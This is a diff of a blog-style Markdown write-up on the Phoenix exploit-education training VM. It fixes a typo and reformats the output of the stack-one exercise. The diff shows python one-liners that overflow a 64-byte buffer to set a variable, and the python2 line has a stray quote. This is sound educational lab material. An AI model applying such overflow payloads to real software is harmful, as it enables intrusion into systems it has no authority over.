@@ -9,7 +9,7 @@ description: "Adventures in Learning ROP (Return Oriented Programming) | Using E
 
 The Phoenix VM Image can be found here:  https://exploit.education/phoenix/
 
-The virtual machine containers a number of vulnerable executables that allow students to learn stack, format-string, and heap-based overflows. The stack series contains executables stack 0-6. Format string vulnerabilities include format 0-4, and the heap vulnerabilitites include head 0-3.  
+The virtual machine containers a number of vulnerable executables that allow students to learn stack, format-string, and heap-based overflows. The stack series contains executables stack 0-6. Format string vulnerabilities include format 0-4, and the heap vulnerabilitites include heap 0-3.  
 
 # Stack 0
 
@@ -59,17 +59,19 @@ We can pass this to the stack-one executable as such:
 __python__
 ```bash
 ./stack-one $($python -c 'print "A" * 64" + "\x62\x59\x6c\x49"')
-
-Welcome to phoenix/stack-one, brought to you by https://exploit.education
-Well done, you have successfully set changeme to the correct value  
 ```
+>Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Well done, you have successfully set changeme to the correct value  
+
 
 __python3__
 ```bash
 ./stack-one $(python3 -c 'print("A"*64 + "\x62\x59\x6c\x49")')
-Welcome to phoenix/stack-one, brought to you by https://exploit.education
-Well done, you have successfully set changeme to the correct value
 ```
+
+>Welcome to phoenix/stack-one, brought to you by https://exploit.education
+Well done, you have successfully set changeme to the correct value
+
 
 
 
